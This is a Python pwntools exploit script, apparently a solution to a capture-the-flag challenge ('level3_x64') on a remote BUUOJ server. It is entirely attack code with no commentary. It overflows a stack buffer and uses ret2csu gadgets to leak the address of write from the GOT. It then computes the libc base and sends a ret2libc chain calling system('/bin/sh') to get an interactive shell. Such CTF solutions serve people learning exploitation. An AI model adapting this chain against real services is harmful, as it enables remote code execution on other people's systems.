from pwn import *


# p = process("./level3_x64")
p = remote("node4.buuoj.cn", 26670)
pro = ELF("./level3_x64")


write_g = pro.got["write"]
start = 0x04004F0
pop_rdi_ret = 0x04006b3
pop_six = 0x04006AA
mov_call = 0x0400690

def leak():
    p.recv()
    pad = cyclic(0x80+0x8)
    pad += p64(pop_six)+p64(0)+p64(1)+p64(write_g)
    pad += p64(0x8)+p64(write_g)+p64(1)+p64(mov_call)
    pad += cyclic(56)+p64(start)
    p.send(pad)
    info = p.recv(8)

    return info

# leak
info = u64(leak())
print("leak: ", hex(info))

# count
libc = ELF("/home/fanxinli/libc-so/libc-2.23-64.so")
base = info-libc.sym["write"]
print("base: ", hex(base))
system = base+libc.sym["system"]
binsh = base+next(libc.search(b"/bin/sh\x00"))

# attack
pad = cyclic(0x80+0x8)
pad += p64(pop_rdi_ret)+p64(binsh)+p64(system)
p.send(pad)

p.interactive() 


